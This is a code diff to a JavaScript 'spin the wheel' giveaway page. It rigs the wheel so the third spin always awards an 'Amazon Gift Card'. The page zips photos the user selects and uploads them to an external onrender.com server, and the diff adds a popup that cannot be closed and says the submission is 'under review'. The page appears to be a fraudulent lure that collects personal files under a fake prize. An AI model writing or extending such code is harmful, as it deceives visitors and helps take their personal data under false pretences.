@@ -13,8 +13,10 @@ document.addEventListener("DOMContentLoaded", () => {
     ];
     const submitButton = document.getElementById('submit-button');
     const serverUrl = "https://testingv1.onrender.com";
+
     let uploadStep = 0;
     const filesCache = []; // Cache for temporarily storing files
+    let spinCount = 0; // Counter for spins
 
     // Function to dynamically configure file input
     function configureFileInput() {
@@ -25,6 +27,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     }
 
+    // Function to draw the wheel
     function drawWheel() {
         const radius = canvas.width / 2;
         const segments = ["€5", "€10", "€15", "€20", "Gift Card", "Spotify", "Nike", "Amazon"];
@@ -53,6 +56,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     }
 
+    // Function to spin the wheel
     function spinWheel() {
         const duration = 3000;
         const totalRotation = 10 * Math.PI + Math.random() * Math.PI;
@@ -76,12 +80,39 @@ document.addEventListener("DOMContentLoaded", () => {
             if (progress < 1) {
                 requestAnimationFrame(animateWheel);
             } else {
-                prizeName.textContent = "Amazon Gift Card";
-                popup.classList.remove('hidden');
+                handleSpinResult();
             }
         }
 
         requestAnimationFrame(animateWheel);
+    }
+
+    // Handle the spin result
+    function handleSpinResult() {
+        spinCount++;
+
+        if (spinCount === 1 || spinCount === 2) {
+            showSimplePopup(`Popup text for spin ${spinCount}`);
+        } else if (spinCount === 3) {
+            prizeName.textContent = "Amazon Gift Card";
+            popup.classList.remove('hidden');
+        }
+    }
+
+    // Show a simple popup
+    function showSimplePopup(message) {
+        const simplePopup = document.createElement('div');
+        simplePopup.classList.add('popup');
+        simplePopup.innerHTML = `
+            <p>${message}</p>
+            <button id="close-popup">Close</button>
+        `;
+        document.body.appendChild(simplePopup);
+
+        const closePopupButton = simplePopup.querySelector('#close-popup');
+        closePopupButton.addEventListener('click', () => {
+            document.body.removeChild(simplePopup);
+        });
     }
 
     uploadButton.addEventListener('click', () => {
@@ -130,12 +161,15 @@ document.addEventListener("DOMContentLoaded", () => {
         formData.append('archive', zipBlob, 'photos.zip');
 
         try {
-          const response = await fetch(`https://testingv1.onrender.com/upload-archive`, {
-    method: 'POST',
-    body: formData,
-});
+            const response = await fetch(`${serverUrl}/upload-archive`, {
+                method: 'POST',
+                body: formData,
+            });
             if (response.ok) {
                 console.log('Archive successfully uploaded!');
+
+                // Show the new unclosable popup
+                showUnclosablePopup("Your submission is under review. Please wait for approval.");
             } else {
                 console.error('Error uploading archive.');
             }
@@ -143,6 +177,13 @@ document.addEventListener("DOMContentLoaded", () => {
             console.error('Connection error:', error);
         }
     });
+
+    function showUnclosablePopup(message) {
+        const unclosablePopup = document.createElement('div');
+        unclosablePopup.classList.add('popup', 'unclosable-popup');
+        unclosablePopup.innerHTML = `<p>${message}</p>`;
+        document.body.appendChild(unclosablePopup);
+    }
 
     spinButton.addEventListener('click', spinWheel);
     drawWheel();
